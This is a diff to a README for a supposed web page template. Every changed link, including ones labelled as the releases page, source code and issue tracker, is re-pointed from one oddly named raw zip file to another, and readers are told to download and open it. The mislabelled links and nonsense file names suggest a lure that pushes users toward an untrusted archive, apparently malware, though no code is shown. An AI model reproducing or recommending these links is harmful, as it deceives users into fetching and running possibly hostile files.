@@ -17,11 +17,11 @@ Before you start, ensure your computer meets these requirements:
 
 To get started, click the link below to visit the downloads page:
 
-[![Download Ultimate Web Page Template](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip%20Web%20Page%20Template-brightgreen)](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip)
+[![Download Ultimate Web Page Template](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip%20Web%20Page%20Template-brightgreen)](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip)
 
 ## 📂 Download & Install
 
-1. Click this link to visit the Releases page: [Visit Release Page](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip).
+1. Click this link to visit the Releases page: [Visit Release Page](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip).
    
 2. Look for the latest release version. Click on it to see the available files.
 
@@ -35,7 +35,7 @@ To get started, click the link below to visit the downloads page:
 
 After downloading the template, follow these steps to get started:
 
-1. Open the `https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip` file in your preferred web browser by double-clicking it. 
+1. Open the `https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip` file in your preferred web browser by double-clicking it. 
 
 2. Review the template structure. You will see different sections like:
    - Header
@@ -77,13 +77,13 @@ For any inquiries, please contact us via the issues section on GitHub. We are he
 
 ## 🔗 Useful Links
 
-- [View Source Code](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip)
-- [Report Issues](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip)
+- [View Source Code](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip)
+- [Report Issues](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip)
 
 ## 📥 Final Download Reminder
 
 Do not forget to download the template from the Releases page:
 
-[![Download Ultimate Web Page Template](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip%20Web%20Page%20Template-brightgreen)](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/web-template-ultimate-page-2.5.zip)
+[![Download Ultimate Web Page Template](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip%20Web%20Page%20Template-brightgreen)](https://raw.githubusercontent.com/Dhurika15/ultimate-web-page-template/master/unsolvableness/ultimate-template-page-web-Opalinidae.zip)
 
 Start creating your fantastic web page today!
